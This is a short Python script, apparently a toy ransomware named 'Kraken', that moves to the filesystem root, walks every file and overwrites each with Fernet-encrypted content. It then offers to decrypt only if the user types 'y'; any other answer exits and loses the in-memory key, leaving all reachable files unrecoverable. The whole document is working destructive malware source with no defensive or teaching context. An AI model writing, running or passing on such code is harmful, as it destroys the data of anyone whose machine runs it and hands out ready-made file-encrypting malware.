# =========================================================== #
# Kraken v.0.0.1
# =========================================================== #
import os
import sys
#from secrets import token_urlsafe
from cryptography.fernet import Fernet

# Generate new fernet key:
key = Fernet(Fernet.generate_key())

# Go to Home:
try:
    os.chdir('../../../../../../../../../../../../../')
except Exception as error:
    print(error)

# List files:
files = []
for dirpath, dirs, files_in_dir in os.walk(os.getcwd()):
    for f in files_in_dir:
        absolute_path = os.path.abspath(os.path.join(dirpath, f))
        files.append(absolute_path)


# Encrypt files:
for file in files:
    try:
        # Do not encrypt this file!
        if file != sys.argv[0]:
            # Read original content:
            with open(file, "rb") as archive:
                original_data = archive.read()
            # Encrypt and overwrite:
            with open(file, "wb") as archive:
                archive.write(key.encrypt(original_data))
    except Exception as error:
        print(error)
        continue


# Recover now?
opt = input("Recover? <y/n> ").lower()
if opt != "y":
    sys.exit()

# Recover files:
for file in files:
    try:
        # This file was not affected.
        if file != sys.argv[0]:
            # Read encrypted content:
            with open(file, "rb") as archive:
                encrypted_data = archive.read()
            # Decrypt and overwrite:
            with open(file, "wb") as archive:
                archive.write(key.decrypt(encrypted_data))
    except Exception as error:
        print(error)
        continue
